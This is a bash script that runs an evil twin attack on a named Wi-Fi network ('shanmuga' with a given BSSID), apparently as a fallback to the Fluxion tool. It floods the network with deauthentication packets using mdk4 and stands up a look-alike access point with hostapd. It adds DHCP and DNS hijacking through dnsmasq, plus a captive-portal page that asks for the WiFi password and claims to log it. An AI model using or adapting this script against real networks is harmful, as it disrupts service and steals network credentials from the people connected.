#!/bin/bash
# Manual Evil Twin Attack Script
# Run this if Fluxion keeps failing

echo "🎭 MANUAL EVIL TWIN ATTACK"
echo "=========================="
echo ""

# Configuration
TARGET_SSID="shanmuga"
TARGET_BSSID="1A:F6:34:4F:38:0F"
TARGET_CHANNEL="11"

# Step 1: Enable monitor mode
echo "[1/7] Enabling monitor mode..."
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sleep 2

# Step 2: Start deauth attack in background
echo "[2/7] Starting deauth attack..."
sudo mdk4 wlan0mon d -c $TARGET_CHANNEL -b $TARGET_BSSID &
DEAUTH_PID=$!
echo "Deauth PID: $DEAUTH_PID"

# Step 3: Create fake AP config
echo "[3/7] Creating fake AP configuration..."
cat > /tmp/fake-hostapd.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Step 4: Start fake AP
echo "[4/7] Starting fake AP '$TARGET_SSID'..."
sudo hostapd /tmp/fake-hostapd.conf &
HOSTAPD_PID=$!
sleep 3

# Step 5: Configure network
echo "[5/7] Configuring network..."
sudo ip addr add 192.168.1.1/24 dev wlan0mon
sudo ip link set wlan0mon up

# Step 6: Start DHCP
echo "[6/7] Starting DHCP server..."
cat > /tmp/dnsmasq.conf << EOF
interface=wlan0mon
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
no-resolv
log-queries
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf &
DNSMASQ_PID=$!

# Step 7: Web server with captive portal
echo "[7/7] Starting web server..."
mkdir -p /tmp/portal
cat > /tmp/portal/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Network Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 320px;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .warning {
            color: #666;
            font-size: 12px;
            text-align: center;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>⚠️ Network Authentication</h2>
        <p style="color: #666;">Router configuration required</p>
        <form action="http://192.168.1.1/check.php" method="POST">
            <input type="text" name="ssid" value="shanmuga" readonly>
            <input type="password" name="password" placeholder="Enter WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <div class="warning">
            Educational demonstration only
        </div>
    </div>
</body>
</html>
HTMLEOF

cd /tmp/portal
sudo python3 -m http.server 80 &
WEB_PID=$!

echo ""
echo "✅ EVIL TWIN ATTACK RUNNING!"
echo "=============================="
echo ""
echo "Fake AP: $TARGET_SSID"
echo "Channel: $TARGET_CHANNEL"
echo "Deauth PID: $DEAUTH_PID"
echo "Hostapd PID: $HOSTAPD_PID"
echo "DHCP PID: $DNSMASQ_PID"
echo "Web PID: $WEB_PID"
echo ""
echo "📱 ON YOUR TABLET:"
echo "1. Turn OFF phone hotspot"
echo "2. Disconnect from WiFi"
echo "3. Reconnect to 'shanmuga'"
echo "4. Browser will open with fake portal"
echo "5. Enter password - it will be logged!"
echo ""
echo "🛑 TO STOP:"
echo "   Press Ctrl+C or run: sudo pkill -9 mdk4 hostapd dnsmasq python3"
echo ""
echo "📝 Check /tmp/portal for password attempts"
echo ""

# Keep script running
tail -f /dev/null
